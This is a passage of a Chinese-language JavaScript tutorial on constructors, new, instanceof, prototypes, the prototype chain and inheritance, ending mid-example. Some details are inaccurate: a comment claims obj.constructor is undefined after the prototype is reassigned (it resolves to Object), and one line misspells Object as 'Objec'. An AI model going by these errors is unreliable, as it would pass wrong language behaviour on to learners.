        <content type="html"><![CDATA[<h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>面向对象编程思想，顾名思义，即模仿现实世界的存在物，一切节对象，拥有各自的特性与行为，如人类，外貌、肤色、身高、体重等是其特征，能吃饭睡觉行走是其行为；</p><p>同样，编程中，一个对象拥有 **属性(key/property)**，相当于人类的特征，当然这些属性一般都有 **属性值(value)**，相当于人类特征的具体内容，如黄皮肤、身高 180cm；对象还拥有一类特殊属性，叫 **方法(method)**，也可以理解为一种属性，只不过它的属性值是一个函数，对象的方法就相当于人类的行为，如行走、吃饭、说话，别人叫你名字时你会做出回应等；</p><h1 id="构造函数"><a href="#构造函数" class="headerlink" title="构造函数"></a>构造函数</h1><p>通常申明一个对象是这样的：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> obj <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    <span class="token literal-property property">name</span><span class="token operator">:</span> <span class="token string">'knight'</span><span class="token punctuation">,</span>  <span class="token comment">// name, age 是对象 obj 的属性</span>    <span class="token literal-property property">age</span><span class="token operator">:</span> <span class="token number">20</span><span class="token punctuation">,</span>    <span class="token function-variable function">greet</span><span class="token operator">:</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">you</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token comment">// greet 是对象 obj 的方法，可以接受参数</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'Hello '</span> <span class="token operator">+</span> you <span class="token operator">+</span> <span class="token string">', my name is '</span> <span class="token operator">+</span> <span class="token keyword">this</span><span class="token punctuation">.</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>obj<span class="token punctuation">.</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// 'knight'</span>obj<span class="token punctuation">.</span><span class="token function">greet</span><span class="token punctuation">(</span><span class="token string">'cloud'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token comment">// 'Hello cloud, my name is knight'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>面向对象编程则使用 <strong>构造函数</strong> 创建一个 <strong>对象构造器</strong>，例如：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">Obj</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> <span class="token string">'knight'</span><span class="token punctuation">,</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>age <span class="token operator">=</span> <span class="token number">20</span><span class="token punctuation">,</span>    <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function-variable function">greet</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">you</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'Hello '</span> <span class="token operator">+</span> you <span class="token operator">+</span> <span class="token string">', my name is '</span> <span class="token operator">+</span> <span class="token keyword">this</span><span class="token punctuation">.</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>其实就是申明一个函数，只不过函数名通常首字母大写来区分普通函数，函数的作用也与普通函数有所区别；其中的 <strong><code>this</code></strong> 指向当前环境的对象，是一种方便的写法；</p><h1 id="对象实例"><a href="#对象实例" class="headerlink" title="对象实例"></a>对象实例</h1><p>上面创建了一个对象构造函数，当然这还只是一个函数，不是一个直接能用的对象，从构造函数得到对应的对象，称为创建该构造函数的一个 **实例(instance)**，即一个新对象，使用 <code>new</code> 关键字：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">Obj</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> <span class="token string">'knight'</span><span class="token punctuation">,</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>age <span class="token operator">=</span> <span class="token number">20</span><span class="token punctuation">,</span>    <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function-variable function">greet</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">you</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'Hello '</span> <span class="token operator">+</span> you <span class="token operator">+</span> <span class="token string">', my name is '</span> <span class="token operator">+</span> <span class="token keyword">this</span><span class="token punctuation">.</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">var</span> obj <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Obj</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// 创建对象实例</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>obj<span class="token punctuation">.</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// "knight"</span>obj<span class="token punctuation">.</span><span class="token function">greet</span><span class="token punctuation">(</span><span class="token string">'cloud'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// "Hello cloud, my name is knight"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="new"><a href="#new" class="headerlink" title="new"></a>new</h2><p>使用 <code>new</code> 关键字时，其实大致执行了以下操作：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// 正常使用 new</span><span class="token keyword">function</span> <span class="token function">Obj</span><span class="token punctuation">(</span><span class="token parameter">name</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">var</span> obj <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Obj</span><span class="token punctuation">(</span><span class="token string">'Knight'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>obj<span class="token punctuation">.</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// Knight</span><span class="token comment">// 模拟使用 new</span><span class="token keyword">function</span> <span class="token function">Obj</span><span class="token punctuation">(</span><span class="token parameter">name</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function">_new</span><span class="token punctuation">(</span><span class="token parameter">fn<span class="token punctuation">,</span> name</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">var</span> result <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span> <span class="token comment">// 先创建一个空对象</span>    result<span class="token punctuation">.</span>__proto__ <span class="token operator">=</span> fn<span class="token punctuation">.</span>prototype<span class="token punctuation">;</span> <span class="token comment">// 执行原型链连接</span>    <span class="token keyword">var</span> _result <span class="token operator">=</span> <span class="token function">fn</span><span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span>result<span class="token punctuation">,</span> name<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 执行构造函数方法</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>_result<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">// 构造函数有返回值则返回该值</span>        <span class="token keyword">return</span> _result<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> result<span class="token punctuation">;</span> <span class="token comment">// 否则返回该对象</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">var</span> obj <span class="token operator">=</span> <span class="token function">_new</span><span class="token punctuation">(</span>Obj<span class="token punctuation">,</span> <span class="token string">'Knight'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>obj<span class="token punctuation">.</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// Knight</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="instanceof"><a href="#instanceof" class="headerlink" title="instanceof"></a>instanceof</h2><p>判断某对象是否是某函数的实例，需要用到 <code>instanceof</code> 操作符，注意是操作符，类似 <code>+ - * /</code>，而不是函数，用法如下：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> date <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Date</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>date <span class="token keyword">instanceof</span> <span class="token class-name">Date</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// true</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="constructor-NaN"><a href="#constructor-NaN" class="headerlink" title="constructor"></a>constructor</h2><p>反过来，想要知道某对象的构造函数，可以使用 <code>constructor</code> 属性，一般对象都有这个属性，其值为该对象的构造函数；</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">Obj</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> <span class="token string">'knight'</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">var</span> obj <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Obj</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>obj<span class="token punctuation">.</span>constructor<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// function Obj()&#123;this.name='knight'&#125;</span><span class="token keyword">var</span> date <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Date</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>date<span class="token punctuation">.</span>constructor<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// function Date()&#123;[native code]&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="原型"><a href="#原型" class="headerlink" title="原型"></a>原型</h1><p>构造函数创建实例后，函数内部定义的属性和方法也会复制一份到实例中，这类属性称为 <strong>own property</strong>，对象实例可以通过方法 <code>hasOwnProperty()</code> 检测是否拥有某属性，返回 <code>true / false</code>；</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">Obj</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> <span class="token string">'knight'</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">var</span> obj <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Obj</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>obj<span class="token punctuation">.</span><span class="token function">hasOwnProperty</span><span class="token punctuation">(</span><span class="token string">'name'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// true</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>构造函数还能定义一种属性，叫做 <strong>prototype</strong>(原型)，这样所有实例都能获取函数定义的 <strong>公共</strong> 属性，定义方式如下：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">Obj</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> <span class="token string">'knight'</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token class-name">Obj</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>age <span class="token operator">=</span> <span class="token number">20</span><span class="token punctuation">;</span> <span class="token comment">// 只能外部定义，不能在函数内部定义；</span><span class="token keyword">var</span> obj <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Obj</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>obj<span class="token punctuation">.</span>age<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 20</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>注意：</strong><code>prototype</code> 是函数的一个属性，同时<strong>对象</strong>也有一个隐式的原型，即对象的 <code>__proto__</code> 属性（前后各有两个下划线）指向其构造函数的 <code>prototype</code>，另外函数也存在 <code>__proto__</code> 属性指向其构造函数，不过对象是没有 <code>prototype</code> 属性的；通常存在以下关系：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">Obj</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">var</span> obj <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Obj</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>obj<span class="token punctuation">.</span>__proto__ <span class="token operator">===</span> <span class="token class-name">Obj</span><span class="token punctuation">.</span>prototype<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// true</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>其实这就是常说的<strong>原型链</strong>，一般对象存在以下原型链指向关系：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> o <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>o<span class="token punctuation">.</span>__proto__ <span class="token operator">===</span> <span class="token class-name">Object</span><span class="token punctuation">.</span>prototype<span class="token punctuation">;</span> <span class="token comment">// true，对象是 Object 的实例</span>Object<span class="token punctuation">.</span>__proto__ <span class="token operator">===</span> <span class="token class-name">Function</span><span class="token punctuation">.</span>prototype<span class="token punctuation">;</span> <span class="token comment">// true，Object 是 Function 的实例，因为 Object 本身就是函数</span>Function<span class="token punctuation">.</span>__proto__ <span class="token operator">===</span> <span class="token class-name">Function</span><span class="token punctuation">.</span>prototype<span class="token punctuation">;</span> <span class="token comment">// true，Function 是 Function 的实例，Function 也是函数</span><span class="token class-name">Function</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>__proto__ <span class="token operator">===</span> <span class="token class-name">Object</span><span class="token punctuation">.</span>prototype<span class="token punctuation">;</span> <span class="token comment">//true，函数的原型其实是个对象</span><span class="token class-name">Objec</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>__proto__ <span class="token operator">===</span> <span class="token keyword">null</span><span class="token punctuation">;</span> <span class="token comment">// true，这是原型链指向的顶端，默认设为 null</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>当定义较多属性时，可以将 <code>prototype</code> 定义为一个新对象：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">Obj</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> <span class="token string">'knight'</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token class-name">Obj</span><span class="token punctuation">.</span>prototype <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    <span class="token literal-property property">age</span><span class="token operator">:</span> <span class="token number">20</span><span class="token punctuation">,</span>    <span class="token literal-property property">hobby</span><span class="token operator">:</span> <span class="token string">'game'</span><span class="token punctuation">&#125;</span><span class="token keyword">var</span> obj <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Obj</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>obj<span class="token punctuation">.</span>hobby<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 'game'</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>obj<span class="token punctuation">.</span>constructor<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// undefined</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>如上，将 <code>prototype</code> 定义为新对象时，会 <strong>删除</strong> 对象的 <code>constructor</code> 值，因为 <code>constructor</code> 属性是定义在构造函数的 <code>prototype</code> 对象中的，所以从新定义 <code>prototype</code> 对象时需要 <strong>添加</strong> <code>constructor</code> 属性喝值：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">Obj</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> <span class="token string">'knight'</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token class-name">Obj</span><span class="token punctuation">.</span>prototype <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    <span class="token literal-property property">constructor</span><span class="token operator">:</span> Obj<span class="token punctuation">,</span> <span class="token comment">// 只需写出构造函数名即可</span>    <span class="token literal-property property">age</span><span class="token operator">:</span> <span class="token number">20</span><span class="token punctuation">,</span>    <span class="token literal-property property">hobby</span><span class="token operator">:</span> <span class="token string">'game'</span><span class="token punctuation">&#125;</span><span class="token keyword">var</span> obj <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Obj</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>obj<span class="token punctuation">.</span>constructor<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// function Obj()&#123;this.name='knight'&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里也可看出，<code>constructor</code> 虽然可以判断对象的构造函数，但是它却是可以被更改的，因此尽量使用 <code>instanceof</code> 判断；</p><h1 id="遍历对象属性"><a href="#遍历对象属性" class="headerlink" title="遍历对象属性"></a>遍历对象属性</h1><p>常用的遍历方法是 <code>for...in</code>，该方法可以遍历出对象的所有属性，包括原型 <code>prototype</code> 中定义的属性，因为 <code>prototype</code> 中的属性是无法用 <code>.hasOwnProperty()</code> 方法访问的，用法如下:</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">Obj</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> <span class="token string">'knight'</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token class-name">Obj</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>age <span class="token operator">=</span> <span class="token number">20</span><span class="token punctuation">;</span><span class="token keyword">var</span> obj <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Obj</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>obj<span class="token punctuation">.</span><span class="token function">hasOwnProperty</span><span class="token punctuation">(</span><span class="token string">'age'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 非 own 属性</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> i <span class="token keyword">in</span> obj<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token string">': '</span> <span class="token operator">+</span> obj<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">/*'name': 'knight''age': 20*/</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="继承"><a href="#继承" class="headerlink" title="继承"></a>继承</h1><p>多个构造函数需要相同的 <code>prototype</code> 时，避免每个设置一遍，重复代码，可以定义一个公共的 <code>prototype</code>，使用 <code>Object.create()</code> 复用代码:</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> common <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    <span class="token literal-property property">age</span><span class="token operator">:</span> <span class="token number">20</span><span class="token punctuation">&#125;</span><span class="token keyword">var</span> obj <span class="token operator">=</span> Object<span class="token punctuation">.</span><span class="token function">create</span><span class="token punctuation">(</span>common<span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>obj<span class="token punctuation">.</span>age<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 20</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// &#123;&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>注意 <code>Object.create()</code> 方法是将括号内的对象设置为定义的对象的 <code>__proto__</code> 属性，所以直接输出 <code>obj</code> 会出现 <code>&#123;&#125;</code>，但是却可以访问其值，即该值在它的原型链上；</p><p>该方法也可以用来 <strong>继承</strong> 其他构造函数的 <code>prototype</code> 属性，实现代码复用：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">Common</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>hobby <span class="token operator">=</span> <span class="token string">'game'</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token class-name">Common</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>age <span class="token operator">=</span> <span class="token number">20</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">Obj</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> <span class="token string">'knight'</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// Obj 继承 Common</span><span class="token class-name">Obj</span><span class="token punctuation">.</span>prototype <span class="token operator">=</span> Object<span class="token punctuation">.</span><span class="token function">create</span><span class="token punctuation">(</span><span class="token class-name">Common</span><span class="token punctuation">.</span>prototype<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 相当于 Obj.prototype.__proto__ = Common.prototype</span><span class="token comment">// 不要忘记把 constructor 改回来</span><span class="token class-name">Obj</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>constructor <span class="token operator">=</span> Obj<span class="token punctuation">;</span><span class="token keyword">var</span> obj <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Obj</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>obj<span class="token punctuation">.</span>age<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 20</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// &#123;name: "knight"&#125;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>obj<span class="token punctuation">.</span>hobby<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// undefined</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>不过该方法存在问题，即子类只能继承父类原型中的属性和方法，父类中的私有属性和方法无法获取；</p><p>改进版：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">Common</span><span class="token punctuation">(</span><span class="token parameter">name</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>age <span class="token operator">=</span> <span class="token number">20</span><span class="token punctuation">;</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function">Obj</span><span class="token punctuation">(</span><span class="token parameter">name</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">Common</span><span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">,</span> name<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token class-name">Obj</span><span class="token punctuation">.</span>prototype <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Common</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">Obj</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>constructor <span class="token operator">=</span> Obj<span class="token punctuation">;</span><span class="token keyword">var</span> obj <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Obj</span><span class="token punctuation">(</span><span class="token string">'Knight'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// &#123;age: 20, name: "Knight"&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里就解决了之前的问题，子类可以继承父类的私有属性和方法，并且还能进行参数传递，同时也继承了父类的原型中的属性和方法；但是，细看会发现，构造函数其实被执行了两次，因此在实例和实例的原型中会出现相同的属性；</p><p>最终版：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">Common</span><span class="token punctuation">(</span><span class="token parameter">name</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>age <span class="token operator">=</span> <span class="token number">20</span><span class="token punctuation">;</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function">Obj</span><span class="token punctuation">(</span><span class="token parameter">name</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">Common</span><span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">,</span> name<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// 相当于只执行了 obj.prototype = new Common(); 步骤中的原型链连接操作</span><span class="token comment">// 即 obj.prototype.__proto__ = Common.prototype</span><span class="token comment">// 而没有执行构造函数 Common()</span><span class="token class-name">Obj</span><span class="token punctuation">.</span>prototype <span class="token operator">=</span> Object<span class="token punctuation">.</span><span class="token function">create</span><span class="token punctuation">(</span><span class="token class-name">Common</span><span class="token punctuation">.</span>prototype<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">Obj</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>constructor <span class="token operator">=</span> Obj<span class="token punctuation">;</span><span class="token keyword">var</span> obj <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Obj</span><span class="token punctuation">(</span><span class="token string">'Knight'</span><span class="token punctuation">)</span><span class="token 